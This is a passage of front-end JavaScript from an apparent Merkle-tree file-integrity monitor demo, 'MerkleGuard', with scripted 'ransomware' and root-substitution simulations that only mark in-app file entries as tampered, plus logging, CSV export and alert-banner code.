  if (!filenames.length) { await addPresetLinux(); }
  if (!registry.getBaselineRoot()) await takeSnapshot();

  const half = filenames.slice(0, Math.ceil(filenames.length / 2));
  for (const name of half) {
    const f = registry.getFile(name);
    await registry.modifyFile(name, f.content + '\n# RANSOMWARE_ENCRYPTED');
    f.status = 'tampered';
  }
  await registry._rebuildTree();
  refreshAll();
  addLog('ALERT', `ATTACK: Mass compromise — ${half.length} files encrypted`, 'system');

  showSimResult('Mass Compromise (Ransomware)', [
    { text: '[*] Ransomware spreading across filesystem...', type: 'warn', delay: 0 },
    ...half.map((f, i) => ({ text: `[*] Encrypting: ${f}`, type: 'warn', delay: 300 + i * 150 })),
    { text: '', delay: 300 + half.length * 150 },
    { text: '[MerkleGuard] CRITICAL: Multiple hash mismatches detected!', type: 'alert', delay: 400 + half.length * 150 },
    { text: `[MerkleGuard] ${half.length} files compromised.`, type: 'alert', delay: 700 + half.length * 150 },
    { text: '[MerkleGuard] Tree traversal pinpointed all affected nodes.', type: 'alert', delay: 1000 + half.length * 150 },
    { text: '[MerkleGuard] Initiating incident response protocol...', type: 'alert', delay: 1300 + half.length * 150 },
  ]);
}

async function simRootSubstitution() {
  if (!registry.getBaselineRoot()) { await addPresetLinux(); await takeSnapshot(); }
  const fakeRoot = Array(64).fill(0).map(() => Math.floor(Math.random()*16).toString(16)).join('');
  addLog('ALERT', `ATTACK: Root substitution attempted — rejected`, 'system');

  showSimResult('Root Substitution Attack', [
    { text: '[*] Attacker attempting to replace trusted root hash...', type: 'info', delay: 0 },
    { text: `[*] Injecting fake root: ${fakeRoot.slice(0,32)}...`, type: 'warn', delay: 500 },
    { text: '[*] Attacker hopes to pass integrity check with tampered files...', type: 'info', delay: 900 },
    { text: '', delay: 1100 },
    { text: '[MerkleGuard] Root hash substitution detected!', type: 'alert', delay: 1400 },
    { text: `[MerkleGuard] Trusted baseline: ${registry.getBaselineRoot()?.slice(0,32)}...`, type: 'info', delay: 1700 },
    { text: `[MerkleGuard] Attacker root: ${fakeRoot.slice(0,32)}...`, type: 'alert', delay: 2000 },
    { text: '[MerkleGuard] MISMATCH — Root substitution BLOCKED.', type: 'alert', delay: 2300 },
    { text: '[MerkleGuard] Baseline stored securely. Attack neutralized.', type: 'ok', delay: 2600 },
  ]);
}

// ─── Logs ─────────────────────────────────────────────────
function addLog(level, message, file = '') {
  logs.push({
    id: logs.length + 1,
    time: new Date().toLocaleTimeString('en-IN', { hour12: false }),
    level,
    message,
    file
  });
  if (level === 'ALERT') {
    alertCount++;
    showAlert(true, message);
    updateSysStatus('alert');
  }
  renderLogs();
  updateBadges();
}

function renderLogs() {
  const filter = document.getElementById('log-filter')?.value || 'all';
  const tbody = document.getElementById('log-tbody');
  if (!tbody) return;
  const filtered = filter === 'all' ? logs : logs.filter(l => l.level === filter);
  tbody.innerHTML = [...filtered].reverse().map(l => `
    <tr>
      <td class="mono dim">${l.id}</td>
      <td class="mono dim">${l.time}</td>
      <td><span class="log-level log-${l.level.toLowerCase()}">${l.level}</span></td>
      <td class="mono">${escapeHtml(l.message)}</td>
      <td class="mono dim">${escapeHtml(l.file)}</td>
    </tr>
  `).join('');
}

function clearLogs() { logs = []; alertCount = 0; renderLogs(); updateBadges(); }

function exportLogs() {
  const csv = ['#,Time,Level,Message,File',
    ...logs.map(l => `${l.id},${l.time},${l.level},"${l.message}","${l.file}"`)
  ].join('\n');
  const a = document.createElement('a');
  a.href = URL.createObjectURL(new Blob([csv], { type: 'text/csv' }));
  a.download = `merkleguard-audit-${Date.now()}.csv`;
  a.click();
}

// ─── Activity Feed ────────────────────────────────────────
function renderActivity() {
  const el = document.getElementById('activity-list');
  if (!el) return;
  const recent = [...logs].reverse().slice(0, 6);
  if (!recent.length) {
    el.innerHTML = '<div class="activity-empty">No activity yet. Add files to begin monitoring.</div>';
    return;
  }
  el.innerHTML = recent.map(l => `
    <div class="activity-item">
      <span class="activity-dot activity-dot-${l.level.toLowerCase()}"></span>
      <span class="activity-time mono">${l.time}</span>
      <span class="activity-msg">${escapeHtml(l.message)}</span>
    </div>
  `).join('');
}

// ─── Alert Banner ─────────────────────────────────────────
function showAlert(show, msg = '') {
  const banner = document.getElementById('alert-banner');
  if (show) {
    banner.classList.remove('hidden');
    document.getElementById('alert-msg').textContent = msg;
  } else {
    banner.classList.add('hidden');
  }
}

// ─── Helpers ──────────────────────────────────────────────
function escapeHtml(s) {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}
function formatBytes(b) {
  if (b < 1024) return b + ' B';
  if (b < 1048576) return (b/1024).toFixed(1) + ' KB';
  return (b/1048576).toFixed(1) + ' MB';
}

// Expose handlers used by inline HTML attributes (onclick/onchange).
Object.assign(window, {
  handleFileInput,
  openFolderPicker,
  takeSnapshot,
  scanFiles,
  addPresetLinux,
  addPresetWebApp,
  renderFileList,
  removeSelected,
  toggleSelectAll,
  generateProof,
  simByteFlip,
  simInject,
  simDelete,
  simTimestamp,
  simMassCompromise,
  simRootSubstitution,
  renderLogs,
  exportLogs,
  clearLogs,
  resetAll
});

})();
